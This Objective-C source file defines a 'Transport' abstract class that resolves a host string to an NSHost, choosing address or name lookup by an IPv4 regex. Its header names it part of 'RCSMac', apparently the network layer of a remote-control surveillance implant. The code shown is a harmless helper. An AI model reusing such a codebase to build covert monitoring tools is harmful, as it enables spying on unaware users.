/*
 * RCSMac - Transport Abstract Class
 *  Abstract Class (formal protocol) for a generic network transport
 *
 *
 * Created by revenge on 13/01/2011
 * Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import "Transport.h"


@implementation Transport

- (NSHost *)hostFromString: (NSString *)aHost
{
  NSHost *host;
  NSString *regex = @"\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}";
  NSPredicate *regexPredicate = [NSPredicate predicateWithFormat: @"SELF MATCHES %@", regex];
  
  if (aHost == nil)
    {
#ifdef DEBUG
      errorLog(ME, @"host is nil");
#endif
      
      return nil;
    }
  
  if ([regexPredicate evaluateWithObject: aHost] == YES)
    {
#ifdef DEBUG
      warnLog(ME, @"Host is numeric");
#endif
      
      host = [NSHost hostWithAddress: aHost];
    }
  else
    {
#ifdef DEBUG
      warnLog(ME, @"Host is a string");
#endif
      
      host = [NSHost hostWithName: aHost];
    }
  
  return host;
}

@end